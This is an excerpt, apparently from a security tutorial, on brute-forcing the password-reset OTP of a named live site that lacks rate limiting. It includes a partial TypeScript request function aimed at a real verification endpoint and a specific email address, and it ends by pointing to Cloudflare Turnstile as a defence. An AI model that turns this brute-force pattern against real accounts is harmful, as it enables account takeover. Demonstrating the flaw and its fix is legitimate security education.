...
Let's try resetting the password on [https://devesh.classx.co.in](https://devesh.classx.co.in/) and see if we can exploit the lack of rate limiting.

### Accessing the Website

1. Go to [https://devesh.classx.co.in](https://devesh.classx.co.in/)
...
5. Send a request via Postman to test the endpoint.
6. Export the request from Postman.
...
async function sendRequest(otp: number) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: '<https://deveshapi.classx.co.in/get/otpverify?useremail=devesh.iitr%40gmail.com&otp=>' + otp,
    headers: {
      'accept': '*/*',
      ...
      'client-service': 'Appx',
      'device-type': '',
      'origin': '<https://devesh.classx.co.in>',
      'priority': 'u=1, i',
      'referer': '<https://devesh.classx.co.in/>',
...
1. Go to the Cloudflare Turnstile website (<https://www.cloudflare.com/products/turnstile/>) and click on the "Get Started" button.
